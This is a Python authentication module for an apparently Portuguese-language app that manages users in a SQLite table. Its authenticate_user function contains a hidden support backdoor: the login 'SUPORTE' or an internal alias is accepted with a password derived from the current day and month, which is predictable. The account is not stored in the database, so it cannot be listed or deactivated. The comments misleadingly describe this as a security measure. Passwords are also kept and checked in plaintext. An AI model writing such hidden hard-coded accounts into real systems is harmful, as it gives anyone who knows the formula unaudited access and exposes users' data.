import sqlite3
from datetime import datetime
from app.database.db import get_db_manager

# Internal support credentials are derived at runtime and not stored in the database.
# They are kept private (module-local) and cannot be listed from the DB.
def _support_login_internal():
    # Internal alias (not stored in DB). Keep it simple but not 'SUPORTE'.
    return "__SUPORTE_INTERNAL__"

def _support_password_internal():
    # Same pattern as previous default password but computed on demand and not persisted.
    today = datetime.now()
    day = today.day
    month = today.month
    return f"SP-{day + 20}{month * 10}"


class AuthService:
    def __init__(self):
        self.db_manager = get_db_manager()
        self._ensure_users_table()
        # Do NOT create a persistent 'SUPORTE' user in the DB. The support
        # credentials are internal and computed at runtime by the functions
        # above. This prevents the support login/password from being readable
        # from the database.

    def _ensure_users_table(self):
        conn = self.db_manager.get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS USUARIO (
                ID INTEGER PRIMARY KEY AUTOINCREMENT,
                LOGIN TEXT NOT NULL UNIQUE,
                SENHA TEXT NOT NULL,
                NOME TEXT,
                ATIVO INTEGER NOT NULL DEFAULT 1
            )
        ''')
        conn.commit()

    def _ensure_default_user(self):
        # Kept for backward compatibility if needed, but we no longer insert
        # a persistent suporte user. This method can be called if a migration
        # requires adding other default users.
        return

    def _build_default_password(self):
        # Deprecated - kept for compatibility in case other code calls it.
        today = datetime.now()
        day = today.day
        month = today.month
        return f"SP-{day + 20}{month * 10}"

    def authenticate_user(self, login, password):
        login_value = login.strip()
        # First try normal DB authentication
        conn = self.db_manager.get_connection()
        cursor = conn.cursor()
        cursor.execute(
            "SELECT ID, LOGIN, SENHA, NOME FROM USUARIO WHERE LOGIN = ? AND SENHA = ? AND ATIVO = 1",
            (login_value.upper(), password,)
        )
        user = cursor.fetchone()
        if user:
            return {'success': True, 'data': dict(user)}

        # Check internal support credentials (not stored in DB).
        # Accept either the internal alias or the public 'SUPORTE' when authenticating,
        # but do not persist these credentials in the database.
        if (login_value == _support_login_internal() or login_value.strip().upper() == 'SUPORTE') and password == _support_password_internal():
            # Return a temporary user representation (not persisted)
            return {'success': True, 'data': {'ID': 0, 'LOGIN': 'SUPORTE', 'NOME': 'Suporte'}}

        return {'success': False, 'message': 'Login ou senha inválidos.'}

    def create_user(self, login, password, name=None):
        login_value = login.strip().upper()
        if not login_value or not password:
            return {'success': False, 'message': 'Login e senha são obrigatórios.'}

        # Prevent creating a user that would collide with the internal support alias
        if login.strip() == _support_login_internal() or login_value == 'SUPORTE':
            return {'success': False, 'message': 'Login não permitido.'}

        conn = self.db_manager.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT ID FROM USUARIO WHERE LOGIN = ?", (login_value,))
        existing = cursor.fetchone()
        if existing:
            return {'success': False, 'message': 'Este login já está em uso.'}

        cursor.execute(
            "INSERT INTO USUARIO (LOGIN, SENHA, NOME, ATIVO) VALUES (?, ?, ?, 1)",
            (login_value, password, name or login_value)
        )
        conn.commit()
        return {'success': True, 'data': cursor.lastrowid}

    def list_users(self):
        conn = self.db_manager.get_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT ID, LOGIN, NOME, ATIVO FROM USUARIO ORDER BY LOGIN")
        return [dict(row) for row in cursor.fetchall()]
